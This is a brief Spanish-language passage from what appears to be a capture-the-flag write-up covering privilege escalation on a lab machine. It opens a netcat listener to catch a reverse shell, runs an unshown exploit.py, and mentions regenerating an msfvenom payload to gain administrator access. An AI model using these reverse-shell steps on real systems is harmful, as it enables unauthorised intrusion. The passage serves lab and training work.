## Privilege Escalation {-}

### Rootear la maquina {-}

#### Etapa final: Ejecucion del script final {-}

1. Nos ponemos en escucha en el puerto 443

    ```bash
    rlwrap nc -nlvp 443
    ```

1. Ejecutamos el script

    ```bash
    python3 exploit.py
    ```

Y ya emos ganados accesso al systema como el usuario que ha lanzado el servicio.
Se puede ahora cambiar el script para que apunte a la maquina victima y ejecutar otra vez el msfvenom para que 
appunte a la buena ip y estamos como administrator.
